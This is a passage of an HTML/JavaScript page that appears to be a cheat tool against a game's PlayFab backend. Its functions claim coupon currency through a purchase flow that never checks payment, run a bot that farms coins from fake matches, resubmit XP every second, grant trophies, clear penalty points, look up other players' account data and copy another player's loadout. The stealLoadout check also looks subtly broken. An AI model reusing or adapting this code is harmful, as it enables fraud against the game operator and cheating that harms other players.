      if (!ItemId || isNaN(Price) || !VirtualCurrency) {
        document.getElementById("purchaseOutput").textContent = "Please fill all fields correctly.";
        return;
      }

      const data = await makeApiCall("Client/PurchaseItem", "POST", {
        ItemId,
        Price,
        VirtualCurrency
      });

      const output = document.getElementById("purchaseOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function grantCoupons() {
      const output = document.getElementById("couponOutput");
      output.textContent = "Starting coupon grant process...";

      try {
        output.textContent += "\nStarting purchase...";
        const startData = await makeApiCall("Client/StartPurchase", "POST", {
          StoreId: "steam_Shop_Currency",
          Items: [{
            ItemId: "Currency_Bundle_PileOfCoupons",
            Quantity: 1
          }]
        });

        if (startData.error) {
          output.textContent += `\nError in StartPurchase: ${startData.error}`;
          return;
        }

        const orderId = startData.data?.OrderId;
        if (!orderId) {
          output.textContent += "\nStartPurchase failed. No OrderId returned.";
          return;
        }

        output.textContent += `\nOrder ID: ${orderId}`;

        output.textContent += "\nPaying for purchase...";
        const payData = await makeApiCall("Client/PayForPurchase", "POST", {
          OrderId: orderId,
          Currency: "RM",
          ProviderName: "Steam"
        });

        output.textContent += "\nConfirming purchase...";

        const confirmData = await makeApiCall("Client/ConfirmPurchase", "POST", {
          OrderId: orderId
        });

        if (confirmData.error) {
          output.textContent += `\nError in ConfirmPurchase: ${confirmData.error}`;
        } else {
          output.textContent += "\nCoupon process completed:\n" + 
            formatResponse(confirmData.data);
        }
      } catch (error) {
        output.textContent += `\nUnexpected error: ${error.message}`;
      }
    }

    async function viewStatistics() {
      const data = await makeApiCall("Client/GetPlayerStatistics", "POST", {});
      const output = document.getElementById("statsOutput");

      if (data.data?.Statistics) {
        const stats = data.data.Statistics.map(stat => 
          `${stat.StatisticName}: ${stat.Value}`
        ).join("\n");
        output.textContent = stats || "No statistics found.";
      } else {
        output.textContent = "Error retrieving statistics: " + 
          (data.error || "Unknown error");
      }
    }

    async function getPlayFabId() {
      const steamUsername = document.getElementById("steamUsername").value.trim();
      if (!steamUsername) {
        alert("Please enter a Steam username.");
        return;
      }

      const data = await makeApiCall("Client/GetPlayFabIDsFromSteamNames", "POST", {
        SteamNames: [steamUsername]
      });

      const output = document.getElementById("playerIdOutput");
      if (data.data?.Data?.[0]) {
        const match = data.data.Data[0];
        output.textContent = `PlayFabId for "${steamUsername}": ${match.PlayFabId}`;
      } else {
        output.textContent = "No matching PlayFab ID found.";
      }
    }

    async function AddCoin() {
      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        FunctionName: "usefulDeed",
        FunctionParameter: {},
        GeneratePlayStreamEvent: true
      });

      const output = document.getElementById("usefulDeedOutput");
      if (data.data?.FunctionName) {
        output.textContent = `‚úÖ usefulDeed executed successfully\nExecution Time: ${data.data.ExecutionTimeSeconds}s\nMemory Used: ${data.data.MemoryConsumedBytes} bytes\nAPI Requests: ${data.data.APIRequestsIssued}`;
      } else {
        output.textContent = "Error: " + (data.error || "Unknown error");
      }
    }

    async function submitLevelProgression() {
      const classId = document.getElementById("classIdInput").value.trim();
      const receivedXP = parseInt(document.getElementById("receivedXPInput").value);
      const XP = parseInt(document.getElementById("xpInput").value);
      const XpToNextLevel = parseInt(document.getElementById("xpToNextLevelInput").value);
      const level = parseInt(document.getElementById("levelInput").value);
      const availablePerkSlotsCount = Math.min(parseInt(document.getElementById("perkSlotsInput").value), 3);
      const playerLevel = parseInt(document.getElementById("playerLevelInput").value);

      if (!classId || isNaN(receivedXP) || isNaN(XP) || isNaN(XpToNextLevel) || 
          isNaN(level) || isNaN(availablePerkSlotsCount) || isNaN(playerLevel)) {
        return { error: "Please fill in all fields correctly." };
      }

      const currentLevelProgression = {
        playerLevel,
        classLevel: [{
          classId,
          XP,
          XpToNextLevel,
          level,
          availablePerkSlotsCount
        }]
      };

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        FunctionName: "setLevelProgressionForClass",
        FunctionParameter: {
          classId,
          receivedXP,
          currentLevelProgression: JSON.stringify(currentLevelProgression)
        },
        GeneratePlayStreamEvent: true
      });

      return data;
    }

    async function getPlayFabInfo() {
      const playfabId = document.getElementById("playfabId").value.trim();
      const output = document.getElementById("playfabInfoOutput");

      if (!playfabId) {
        output.textContent = "Please enter a PlayFab ID.";
        return;
      }

      output.textContent = "Fetching data...";

      const combinedData = await makeApiCall("Client/GetPlayerCombinedInfo", "POST", {
        PlayFabId: playfabId,
        InfoRequestParameters: {
          GetUserAccountInfo: true,
          GetPlayerStatistics: true,
          GetUserInventory: true
        }
      });

      const profileData = await makeApiCall("Client/GetPlayerProfile", "POST", {
        PlayFabId: playfabId,
        ProfileConstraints: {
          ShowLastLogin: true,
          ShowBannedUntil: true
        }
      });

      let resultText = "";

      if (combinedData.data) {
        const info = combinedData.data.InfoResultPayload;
        resultText += "=== ACCOUNT INFO ===\n";
        resultText += `Username: ${info.AccountInfo.TitleInfo?.DisplayName || "N/A"}\n`;
        resultText += `Created: ${info.AccountInfo.Created || "N/A"}\n`;
        resultText += "\n=== STATISTICS ===\n";

        if (info.PlayerStatistics) {
          info.PlayerStatistics.forEach(stat => {
            resultText += `${stat.StatisticName}: ${stat.Value}\n`;
          });
        }
      }

      if (profileData.data) {
        const profile = profileData.data.PlayerProfile;
        resultText += "\n=== PROFILE INFO ===\n";
        resultText += `Last Login: ${profile.LastLogin || "N/A"}\n`;
        resultText += `Banned Until: ${profile.BannedUntil || "Not banned"}\n`;
      }

      if (combinedData.error || profileData.error) {
        resultText += "\n=== ERRORS ===\n";
        if (combinedData.error) resultText += `Combined Info Error: ${combinedData.error}\n`;
        if (profileData.error) resultText += `Profile Error: ${profileData.error}\n`;
      }

      output.textContent = resultText || "No data received.";
    }

    async function updateQuestProgress() {
      const questTextFieldId = document.getElementById("questTextFieldId").value.trim();
      const progressValue = parseInt(document.getElementById("questProgressValue").value);

      if (!questTextFieldId || isNaN(progressValue)) {
        document.getElementById("questOutput").textContent = "Please fill all fields correctly.";
        return;
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "updateActiveQuests",
        FunctionParameter: {
          updatedValues: `{"${questTextFieldId}":${progressValue}}`
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const output = document.getElementById("questOutput");
      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else if (data.data && data.data.FunctionResult) {
        output.textContent = formatResponse(data.data.FunctionResult);
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function increasePenaltyPoints() {
      const output = document.getElementById("penaltyOutput");
      output.textContent = "Increasing penalty points...\n";

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "increaseLowPriorityMatches",
        FunctionParameter: {
          reason: "LEAVE_MATCH"
        },
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      if (data.error) {
        output.textContent += `‚ùå Error: ${data.error}\n`;
      } else {
        output.textContent += `‚úÖ Penalty points increased successfully\n`;
        output.textContent += formatResponse(data.data);
      }
      output.scrollTop = output.scrollHeight;
    }

    async function decreasePenaltyPoints() {
      const output = document.getElementById("penaltyOutput");
      output.textContent = "Decreasing penalty points...\n";

      const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "refreshStartPunishmentLevelTime",
        FunctionParameter: null,
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "getXpMultiplier",
        FunctionParameter: {
          playerCount: 0
        },
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "checkPopCornEvent",
        FunctionParameter: null,
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `‚ùå Error: ${refreshData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `‚ùå Error: ${xpMultiplierData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `checkPopCornEvent: ${popCornData.error ? `‚ùå Error: ${popCornData.error}` : "‚úÖ Success"}\n`;
      output.scrollTop = output.scrollHeight;
    }

    async function startMatchStatusSequence() {
      const playerId = document.getElementById("matchPlayerId").value.trim();
      const output = document.getElementById("penaltyOutput");

      if (!playerId) {
        output.textContent = "Please enter a Player ID for match status.\n";
        return;
      }

      output.textContent = "Starting match status sequence...\n";

      const refreshData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "refreshStartPunishmentLevelTime",
        FunctionParameter: null,
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const xpMultiplierData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "getXpMultiplier",
        FunctionParameter: {
          playerCount: 0
        },
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      const popCornData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "checkPopCornEvent",
        FunctionParameter: null,
        GeneratePlayStreamEvent: false,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      output.textContent += `refreshStartPunishmentLevelTime: ${refreshData.error ? `‚ùå Error: ${refreshData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `getXpMultiplier: ${xpMultiplierData.error ? `‚ùå Error: ${xpMultiplierData.error}` : "‚úÖ Success"}\n`;
      output.textContent += `checkPopCornEvent: ${popCornData.error ? `‚ùå Error: ${popCornData.error}` : "‚úÖ Success"}\n`;
      output.textContent += "Waiting 10 minutes to update match status...\n";
      output.scrollTop = output.scrollHeight;

      setTimeout(async () => {
        const matchData = await makeApiCall("Client/ExecuteCloudScript", "POST", {
          CustomTags: null,
          FunctionName: "changeMatchPlayerStatus",
          FunctionParameter: {
            playerId: playerId,
            matchId: "",
            newStatus: "FINISHED"
          },
          GeneratePlayStreamEvent: true,
          RevisionSelection: null,
          SpecificRevision: null,
          AuthenticationContext: null
        });

        output.textContent += `changeMatchPlayerStatus: ${matchData.error ? `‚ùå Error: ${matchData.error}` : "‚úÖ Success"}\n`;
        output.scrollTop = output.scrollHeight;
      }, 10 * 60 * 1000);
    }

    async function toggleCoinFarmBot() {
      const cloudOutput = document.getElementById("cloudOutput");
      let neighborCoins = 0; // Track Neighbor coins
      let kidCoins = 0; // Track Kid coins
      let neighborPlayerId = null; // Track Neighbor role from decideSpecialRole

      if (coinFarmBotRunning) {
        clearInterval(coinFarmId);
        coinFarmBotRunning = false;
        document.getElementById("botStatus").className = "status-indicator status-inactive";
        document.getElementById("botToggleButton").textContent = "Start Coin Farm Bot";

        // Update output to show only Neighbor and Kid coins
        cloudOutput.textContent += `\n=== Coin Farm Bot Stopped ===\n`;
        cloudOutput.textContent += `Bot stopped at ${new Date().toLocaleTimeString()}\n`;
        cloudOutput.textContent += `Total Neighbor Coins Earned: ${Math.floor(neighborCoins)}\n`;
        cloudOutput.textContent += `Total Kid Coins Earned: ${Math.floor(kidCoins)}\n`;
        cloudOutput.scrollTop = cloudOutput.scrollHeight;

        totalCoinsEarned = 0; // Reset coin counter
        lastCoinFarmResponse = null; // Clear last response
        return;
      }

      const delayMinutes = parseInt(document.getElementById("delaySelect").value);
      const delayMs = delayMinutes * 60 * 1000;

      coinFarmBotRunning = true;
      document.getElementById("botStatus").className = "status-indicator status-active";
      document.getElementById("botToggleButton").textContent = "Stop Coin Farm Bot";

      cloudOutput.textContent = `Starting Coin Farm Bot with ${delayMinutes} minute delay...\n`;

      async function runCoinFarmCycle() {
        const roomType = document.getElementById("roomType").value;
        const playerIds = [
          document.getElementById("playerId1").value.trim(),
          document.getElementById("playerId2").value.trim(),
          document.getElementById("playerId3").value.trim(),
          document.getElementById("playerId4").value.trim(),
          document.getElementById("playerId5").value.trim(),
          document.getElementById("playerId6").value.trim()
        ].filter(id => id);

        let output = `\n=== Cycle started at ${new Date().toLocaleTimeString()}\n`;
        output += `Room Type: ${roomType}\nPlayers: ${playerIds.join(", ") || "None"}\n`;

        let matchId = null;

        try {
          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
            FunctionName: "startNewMatch",
            FunctionParameter: { roomType, playerIds },
            GeneratePlayStreamEvent: true
          });

          if (data.error) {
            output += `‚ùå startNewMatch: Error - ${data.error}\n`;
          } else if (data.data?.FunctionResult?.currentMatchId) {
            matchId = data.data.FunctionResult.currentMatchId;
            output += `‚úÖ startNewMatch: MatchId - ${matchId}\n`;
            lastCoinFarmResponse = data.data;
          } else {
            output += `‚úÖ startNewMatch: Success\n`;
            lastCoinFarmResponse = data.data;
          }
        } catch (err) {
          output += `‚ùå startNewMatch: Exception - ${err.message}\n`;
        }

        try {
          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
            FunctionName: "decideSpecialRole",
            FunctionParameter: { roomType, playerIds },
            GeneratePlayStreamEvent: true
          });

          if (data.error) {
            output += `‚ùå decideSpecialRole: Error - ${data.error}\n`;
          } else {
            output += `‚úÖ decideSpecialRole: Success\n`;
            lastCoinFarmResponse = data.data;
            // Extract Neighbor role using neighborId
            if (data.data?.FunctionResult?.neighborId) {
              neighborPlayerId = data.data.FunctionResult.neighborId;
              output += `Neighbor Role Assigned: ${neighborPlayerId}\n`;
            } else {
              neighborPlayerId = null;
              output += `Neighbor Role Assigned: Unknown\n`;
            }
          }
        } catch (err) {
          output += `‚ùå decideSpecialRole: Exception - ${err.message}\n`;
        }

        if (matchId) {
          try {
            const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
              CustomTags: null,
              FunctionName: "xpConsumed",
              FunctionParameter: {
                token: matchId
              },
              GeneratePlayStreamEvent: true,
              RevisionSelection: null,
              SpecificRevision: null,
              AuthenticationContext: null
            });

            if (data.error) {
              output += `‚ùå xpConsumed: Error - ${data.error}\n`;
            } else {
              output += `‚úÖ xpConsumed: Success\n`;
              lastCoinFarmResponse = data.data;
            }
          } catch (err) {
            output += `‚ùå xpConsumed: Exception - ${err.message}\n`;
          }
        }

        try {
          const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
            FunctionName: "finishMatch",
            FunctionParameter: { roomType, playerIds },
            GeneratePlayStreamEvent: true
          });

          if (data.error) {
            output += `‚ùå finishMatch: Error - ${data.error}\n`;
          } else {
            output += `‚úÖ finishMatch: Success\n`;
            lastCoinFarmResponse = data.data;
            // Parse Logs for coin amounts
            let cycleCoins = 0;
            if (data.data?.Logs) {
              data.data.Logs.forEach(log => {
                const match = log.Message.match(/Coins granted: (\d+)/);
                if (match) {
                  cycleCoins += parseInt(match[1], 10);
                }
              });
            }
            // Attribute coins based on Neighbor role
            if (neighborPlayerId && playerIds.includes(neighborPlayerId)) {
              neighborCoins += cycleCoins;
              output += `üí∞ Coins Earned This Cycle: ${cycleCoins} (Neighbor)\n`;
            } else {
              kidCoins += cycleCoins;
              output += `üí∞ Coins Earned This Cycle: ${cycleCoins} (Kid)\n`;
            }
          }
        } catch (err) {
          output += `‚ùå finishMatch: Exception - ${err.message}\n`;
        }

        cloudOutput.textContent += output;
        cloudOutput.scrollTop = cloudOutput.scrollHeight;
      }

      runCoinFarmCycle();
      coinFarmId = setInterval(runCoinFarmCycle, delayMs);
    }

    async function toggleLevelEditor() {
      if (levelEditorRunning) {
        clearInterval(levelEditorId);
        levelEditorRunning = false;
        document.getElementById("levelEditorStatus").className = "status-indicator status-inactive";
        document.getElementById("levelEditorToggleButton").textContent = "Start Level Editor";
        document.getElementById("levelProgressionOutput").textContent += "\nLevel editor stopped manually.";
        return;
      }

      levelEditorRunning = true;
      document.getElementById("levelEditorStatus").className = "status-indicator status-active";
      document.getElementById("levelEditorToggleButton").textContent = "Stop Level Editor";

      async function runLevelEditor() {
        const result = await submitLevelProgression();
        const output = document.getElementById("levelProgressionOutput");

        if (result.error) {
          output.textContent += `Error: ${result.error}\n`;
        } else if (result.data?.FunctionResult) {
          output.textContent += formatResponse(result.data.FunctionResult) + "\n";
        } else {
          output.textContent += formatResponse(result.data) + "\n";
        }

        output.scrollTop = output.scrollHeight;
      }

      runLevelEditor();
      levelEditorId = setInterval(runLevelEditor, 1000);
    }

    async function grantTrophy() {
      const trophyId = document.getElementById("trophyId").value.trim();
      const output = document.getElementById("apiOutput");

      if (!trophyId) {
        output.textContent = "Please enter a Trophy ID.";
        return;
      }

      const data = await makeApiCall("Client/ExecuteCloudScript", "POST", {
        CustomTags: null,
        FunctionName: "grantTrophy",
        FunctionParameter: { "trophyToGrant": trophyId},
        GeneratePlayStreamEvent: true,
        RevisionSelection: null,
        SpecificRevision: null,
        AuthenticationContext: null
      });

      if (data.error) {
        output.textContent = `Error: ${data.error}`;
      } else if (data.data?.FunctionResult) {
        output.textContent = formatResponse(data.data.FunctionResult);
      } else {
        output.textContent = formatResponse(data.data);
      }
    }

    async function resetLoadout() {
      const output = document.getElementById("resetLoadoutOutput");

      output.textContent = "Resetting Loadout...\n";

      // Update the user's Loadout to an empty object
      const data = await makeApiCall("Client/UpdateUserData", "POST", {
        Data: {
          Loadout: "{}"
        },
        Permission: "Public"
      });

      if (data.error) {
        output.textContent += `‚ùå Error resetting Loadout: ${data.error}\n`;
      } else {
        output.textContent += `‚úÖ Success! Loadout reset to empty.\n`;
        output.textContent += formatResponse(data.data);
      }

      output.scrollTop = output.scrollHeight;
    }

    async function stealLoadout() {
      const targetPlayFabId = document.getElementById("targetPlayFabId").value.trim();
      const output = document.getElementById("stealLoadoutOutput");

      if (!targetPlayFabId) {
        output.textContent = "Please enter a target PlayFab ID.";
        return;
      }

      output.textContent = "Fetching target user's loadout...\n";

      // Step 1: Get the target user's data
      const getData = await makeApiCall("Client/GetUserData", "POST", {
        PlayFabId: targetPlayFabId,
        Keys: ["Loadout"]
      });

      if (getData.error) {
        output.textContent += `‚ùå Error fetching user data: ${getData.error}\n`;
        return;
      }

      if (!getData.data?.Data?.Value.loadout) {
        output.textContent += "‚ùå No Loadout found for the target PlayFab ID.\n";
        return;
      }

      const loadLoadout = getData.data.Data.Loadout.Value;
      output.textContent += `‚úÖ Found Loadout: ${loadLoadout}\nCopying to your account...\n`;

      // Step 2: Update the current user's Loadout with the retrieved data
      const updateData = await makeApiCall("Client/UpdateUserData", "POST", {
        Data: {
          Loadout: loadLoadout
        },
        Permission: "Public"
      });

      if (updateData.error) {
        output.textContent += `‚ùå Error updating Loadout: ${updateData.error}\n`;
      } else {
        output.textContent += `‚úÖ Success! Loadout copied successfully.\n`;
        output.textContent += formatResponse(updateData.data);
      }
      output.scrollTop = output.scrollHeight;
    }
  </script>
</body>
</html>
